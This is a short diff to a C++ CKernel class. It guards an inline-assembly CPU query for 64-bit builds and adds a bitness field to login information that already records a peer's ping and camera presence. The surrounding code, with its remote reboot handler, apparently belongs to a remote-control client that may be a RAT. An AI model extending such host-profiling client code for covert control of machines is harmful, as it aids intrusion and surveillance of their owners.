@@ -652,6 +652,7 @@ void CKernel::GetCPU(TCHAR CPU[128])
 	CHAR  szName[64] = { 0 };
 	TCHAR subKey[] = TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
 
+#ifndef _WIN64
 	__asm
 	{
 		xor esi, esi
@@ -681,7 +682,8 @@ void CKernel::GetCPU(TCHAR CPU[128])
 		jne copyinfo
 	}
 
-	
+#endif
+
 	if (ERROR_SUCCESS != RegCreateKey(
 		HKEY_LOCAL_MACHINE,
 		subKey, &hKey))
@@ -894,6 +896,8 @@ void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
 
 	pLoginInfo->dwPing = GetPing(peer_ip);
 	pLoginInfo->dwHasCamera = HasCamera();
+	
+	pLoginInfo->PE_bit = sizeof(void*) * 8;
 }
 
 void CKernel::OnPower_Reboot()
